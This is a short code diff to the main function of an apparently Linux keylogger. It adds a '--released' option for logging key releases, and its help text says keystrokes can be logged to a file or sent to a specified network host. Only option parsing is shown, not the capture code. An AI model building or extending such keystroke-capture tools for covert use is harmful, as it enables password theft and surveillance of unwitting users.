@@ -18,21 +18,22 @@ void print_help_and_quit(char *application_name);
 
 int main(int argc, char *argv[]){
     int writeout, option, keyboard, option_index = 0;
-    bool network, file;
+    bool network, file, releasedKeys;
     char *option_input;
     
     option = 0;
-    network = file = false;
+    releasedKeys = network = file = false;
     
     static struct option long_options[] = {
       {"silent",   no_argument,       0,  's'},
+      {"released", no_argument,       0,  'r'},
+      {"help",     no_argument,       0,  'h'},
       {"network",  required_argument, 0,  'n'},
       {"file",     required_argument, 0,  'f'},
-      {"help",     no_argument,       0,  'h'},
       {0,          0,                 0,   0 }
     };
     
-    while((option = getopt_long(argc, argv,"sn:f:", long_options, &option_index)) != -1)
+    while((option = getopt_long(argc, argv,"srhn:f:", long_options, &option_index)) != -1)
       {
         switch(option){
             case 's':
@@ -46,6 +47,9 @@ int main(int argc, char *argv[]){
             case 'f':
                 file = true;
                 option_input = optarg;
+                break;
+            case 'r':
+	        releasedKeys = true;
                 break;
 	    case 'h':
 	        print_help_and_quit(argv[0]);
@@ -84,7 +88,7 @@ int main(int argc, char *argv[]){
         return 1;
     }
 
-    keylogger(keyboard, writeout);
+    keylogger(keyboard, writeout, releasedKeys);
     
     close(keyboard);
     close(writeout);
@@ -100,6 +104,7 @@ Log keys on a Linux system to a file or specified host.\n\
   -s         --silent          do not log keys to terminal\n\
   -n host    --network host    log keys to specified host\n\
   -f outfile --file outfile    log keys to specified file\n\
+  -r         --released        log when a key has been released\n\
 ", stdout);
     exit(1);
 }
